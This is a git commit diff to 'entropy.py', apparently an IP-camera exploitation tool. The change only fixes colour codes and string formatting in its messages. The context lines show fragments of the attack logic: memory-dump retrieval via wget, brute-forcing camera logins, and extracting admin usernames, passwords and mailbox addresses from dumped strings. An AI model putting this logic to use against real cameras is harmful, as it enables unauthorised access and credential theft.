2b94bd58faf9458ae57e31bd5fb69d535dd7298e
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2019-11-20 14:07:40 +0300

    Add files via upload

--- entropy.py
+++ entropy.py
@@ -44,10 +44,9 @@ try:
 except ImportError as e:
     C = '\033[1;33m'
     E = '\033[0;97m'
-    D = '\033[0m'
-    print(C+"[!]"+color.E+" Failed to install some necessary dependencies!"+D)
-    print(C+"[!]"+color.E+" Because of this Entropy will be work incorrectly!"+D)
-    print(C+"[!]"+color.E+" You can install dependencies from requirements.txt!"+D)
+    print(C+"[!]"+color.E+" Failed to install some necessary dependencies!")
+    print(C+"[!]"+color.E+" Because of this Entropy will be work incorrectly!")
+    print(C+"[!]"+color.E+" You can install dependencies from requirements.txt!")
     
 
 TMP_PATH='/tmp/'
@@ -84,7 +83,7 @@ if args.outputfile:
     logger.setLevel(logging.INFO)
 
 def handlesignal(signum,frame):
-    print(color.C+"\n[!]" + color.E + " You choose to stop exploiting!"+ color.D)
+    print(color.C+"\n[!]" + color.E + " You choose to stop exploiting!")
     sys.exit(0)
 
 class Color(object):
@@ -92,7 +91,6 @@ class Color(object):
     B = '\033[1;31m'
     C = '\033[1;33m'
     E = '\033[0;97m'
-    D = '\033[0m'
     G = '\033[1;32m'
 
 color=Color()
@@ -122,9 +120,9 @@ class NWThread(threading.Thread):
                     tmp=i.split('\'')
                     macaddr=tmp[1]
                     if args.outputfile:
-                        logger.info(color.A+"[*]"+color.E+" The %s:%s, MAC: %s"+color.D%(self.ip,self.port,macaddr))
+                        logger.info(color.A+"[*]"+color.E+" The %s:%s, MAC: %s"%(self.ip,self.port,macaddr))
                     if args.verbose:
-                        print(color.A+"[*]"+color.E+" The %s:%s, MAC: %s"+color.D%(self.ip,self.port,macaddr))
+                        print(color.A+"[*]"+color.E+" The %s:%s, MAC: %s"%(self.ip,self.port,macaddr))
                     return macaddr
         except Exception:
             return None
@@ -135,18 +133,18 @@ class NWThread(threading.Thread):
                 pw = subprocess.Popen(pw_args,stdout=open(self.tmpstream,'w'))
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured: %s"+color.D%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured: %s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured: %s"+color.D%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured: %s"%(self.ip,self.port,e))
             subprocess.Popen("echo '' > %s" % self.tmpout,shell=True)
             time.sleep(1)
             try:
                 pt = subprocess.Popen("tail --pid=%d -f %s | strings >> %s" % (pw.pid,self.tmpstream, self.tmpout), shell=True)
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured: %s"+color.D%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured: %s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured: %s"+color.D%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured: %s"%(self.ip,self.port,e))
             subprocess.Popen("sed -e 's/replace/%s/g' -e 's/300/%d/g' %s > %s" % (self.forreplace,args.timeout+100,self.base, self.usefile), shell=True)
             time.sleep(0.5)
             subprocess.Popen("chmod a+x %s" % self.usefile, shell=True)
@@ -155,24 +153,24 @@ class NWThread(threading.Thread):
                 padd = subprocess.Popen([self.usefile])
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured: %s"+color.D%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured: %s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured: %s"+color.D%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured: %s"%(self.ip,self.port,e))
             while True:
                 if os.stat(self.tmpout).st_size < 1024:
                     self.init_end_time = time.time()
                     if self.init_end_time - self.starttime > 60:
                         if args.outputfile:
-                            logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!"+color.D%(self.ip,self.port))
-                        print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!"+color.D%(self.ip, self.port))
+                            logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!"%(self.ip,self.port))
+                        print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!" % (self.ip, self.port))
                         break
                 else:
                     for line in tailer.follow(open(self.tmpout, 'r')):
                         self.tail_end_time = time.time()
                         if self.tail_end_time - self.starttime > args.timeout:
                             if args.outputfile:
-                                logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!"+color.D%(self.ip, self.port))
-                            print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!"+color.D%(self.ip, self.port))
+                                logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!" % (self.ip, self.port))
+                            print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!" % (self.ip, self.port))
                             break
                         if self.count == 0:
                             if line == mac:
@@ -196,9 +194,9 @@ class NWThread(threading.Thread):
                     break
         except Exception as e:
             if args.outputfile:
-                logger.error(color.B+"[-]"+color.E+" The error occured in memorydump at %s:%s"+color.D%(self.ip, e))
+                logger.error(color.B+"[-]"+color.E+" The error occured in memorydump at %s:%s" % (self.ip, e))
             if args.verbose:
-                print(color.B+"[-]"+color.E+" The error occured in memorydump at %s:%s"+color.D%(self.ip, e))
+                print(color.B+"[-]"+color.E+" The error occured in memorydump at %s:%s" % (self.ip, e))
         finally:
             try:
                 padd.kill()
@@ -264,8 +262,8 @@ class NWThread(threading.Thread):
                         time.sleep(tmp_sleep)
                         if tmp_r.status_code == 200:
                             if args.outputfile:
-                                logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s"+color.D%(self.ip,self.port,i,j))
-                            print(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s"+color.D%(self.ip,self.port,i,j))
+                                logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s"%(self.ip,self.port,i,j))
+                            print(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s"%(self.ip,self.port,i,j))
                             return
                         else:
                             continue
@@ -282,8 +280,8 @@ class NWThread(threading.Thread):
                             time.sleep(tmp_sleep)
                             if tmp_r.status_code == 200:
                                 if args.outputfile:
-                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s"+color.D%(self.ip, self.port, i, j))
-                                print(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s"+color.D%(self.ip, self.port, i, j))
+                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s" % (self.ip, self.port, i, j))
+                                print(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s" % (self.ip, self.port, i, j))
                                 return
                             else:
                                 continue
@@ -309,9 +307,9 @@ class NWThread(threading.Thread):
                     time.sleep(0)
             else:
                 if args.outputfile:
-                    logger.info(color.C+"[!]"+color.E+" The IP Camera %s:%s may not be vulnerable!"+color.D%(self.ip,self.port))
+                    logger.info(color.C+"[!]"+color.E+" The IP Camera %s:%s may not be vulnerable!" % (self.ip,self.port))
                     logger.info()
-                print(color.C+"[!]"+color.E+" The IP Camera %s:%s may not be vulnerable!"+color.D%(self.ip,self.port))
+                print(color.C+"[!]"+color.E+" The IP Camera %s:%s may not be vulnerable!" % (self.ip,self.port))
                 time.sleep(0)
         except Exception:
             pass
@@ -340,8 +338,8 @@ class GoAThread(threading.Thread):
             time.sleep(tmp_sleeptime)
             if os.stat(self.wget_out_path).st_size > 0:
                 if args.outputfile:
-                    logger.info(color.G+"[+]"+color.E+" The %s:%s is vulnerable!"+color.D%(self.ip,self.port))
-                print(color.G+"[+]"+color.E+" The %s:%s is vulnerable!"+color.D%(self.ip,self.port))
+                    logger.info(color.G+"[+]"+color.E+" The %s:%s is vulnerable!"%(self.ip,self.port))
+                print(color.G+"[+]"+color.E+" The %s:%s is vulnerable!"%(self.ip,self.port))
                 try:
                     pstr = subprocess.Popen(['strings', ], stdin=open(self.wget_out_path, 'r'),
                                             stdout=open(self.strings_out_path, 'w'))
@@ -352,40 +350,40 @@ class GoAThread(threading.Thread):
                             if 'nc' in i or 'sh' in i:
                                 if not self.ftp_flag:
                                     if args.outputfile:
-                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, FTP may be vulnerable!"+color.D%(self.ip, self.port))
-                                    print(color.G+"[+]"+color.E+" The %s:%s, FTP may be vulnerable!"+color.D%(self.ip, self.port))
+                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, FTP may be vulnerable!" % (self.ip, self.port))
+                                    print(color.G+"[+]"+color.E+" The %s:%s, FTP may be vulnerable!" % (self.ip, self.port))
                                     self.ftp_flag=True
                             elif '@' in i:
                                 if not self.mailbox_flag:
                                     tmp_mailbox = i.strip('\n').strip(' ').strip()
                                     if args.outputfile:
-                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, mailbox: %s"+color.D%(self.ip, self.port, tmp_mailbox))
-                                        logger.info(color.G+"[+]"+color.E+" You may check mailbox password manually in directory RECHECK!The file is recheck_%s"+color.D%self.ip)
-                                    print(color.G+"[+]"+color.E+" The %s:%s, mailbox: %s"+color.D%(self.ip, self.port, tmp_mailbox))
-                                    print(color.G+"[+]"+color.E+" You may check mailbox password manually in directory RECHECK! The file is recheck_%s"+color.D%self.ip)
+                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, mailbox: %s" % (self.ip, self.port, tmp_mailbox))
+                                        logger.info(color.G+"[+]"+color.E+" You may check mailbox password manually in directory RECHECK!The file is recheck_%s"%self.ip)
+                                    print(color.G+"[+]"+color.E+" The %s:%s, mailbox: %s" % (self.ip, self.port, tmp_mailbox))
+                                    print(color.G+"[+]"+color.E+" You may check mailbox password manually in directory RECHECK! The file is recheck_%s"%self.ip)
                                     self.mailbox_flag = True
                                     self.keep_strings_file = True
                             elif count == 0:
                                 if 'admin' in i:
                                     tmp_username = i.strip('\n').strip(' ').strip()
                                     if args.outputfile:
-                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s"+color.D%(self.ip, self.port, tmp_username))
-                                    print(color.G+"[+]"+color.E+" The %s:%s, username: %s"+color.D%(self.ip, self.port, tmp_username))
+                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s" % (self.ip, self.port, tmp_username))
+                                    print(color.G+"[+]"+color.E+" The %s:%s, username: %s" % (self.ip, self.port, tmp_username))
                                     count = 1
                                     continue
                             elif count == 1:
                                 tmp_password = i.strip('\n').strip(' ').strip()
                                 if args.outputfile:
-                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, password: %s"+color.D%(self.ip, self.port, tmp_password))
-                                print(color.G+"[+]"+color.E+" The %s:%s, password: %s"+color.D%(self.ip, self.port, tmp_password))
+                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, password: %s" % (self.ip, self.port, tmp_password))
+                                print(color.G+"[+]"+color.E+" The %s:%s, password: %s" % (self.ip, self.port, tmp_password))
                                 break
                             else:
                                 continue
                         else:
                             self.keep_strings_file = True
                             if args.outputfile:
-                                logger.info(color.G+"[+]"+color.E+" The default username is not admin, you need to check manually in directory RECHECK! The file is recheck_%s"+color.D%self.ip)
-                            print(color.G+"[+]"+color.E+" The default username is not admin, you need to check manually in directory RECHECK! The file is recheck_%s"+color.D%self.ip)
+                                logger.info(color.G+"[+]"+color.E+" The default username is not admin, you need to check manually in directory RECHECK! The file is recheck_%s"%self.ip)
+                            print(color.G+"[+]"+color.E+" The default username is not admin, you need to check manually in directory RECHECK! The file is recheck_%s"%self.ip)
                 except Exception as e:
                     if args.outputfile:
                         logger.error(color.B+"[-]"+color.E+" The error occured in getting info part: %s" % e)
@@ -401,8 +399,8 @@ class GoAThread(threading.Thread):
                 try:
                     pw.kill()
                     if args.outputfile:
-                        logger.info(color.C+"[!]"+color.E+" The %s:%s may not be vulnerable!"+color.D%(self.ip,self.port))
-                    print(color.C+"[!]"+color.E+" The %s:%s may not be vulnerable!"+color.D%(self.ip,self.port))
+                        logger.info(color.C+"[!]"+color.E+" The %s:%s may not be vulnerable!"%(self.ip,self.port))
+                    print(color.C+"[!]"+color.E+" The %s:%s may not be vulnerable!"%(self.ip,self.port))
                 except Exception:
                     pass
         finally:
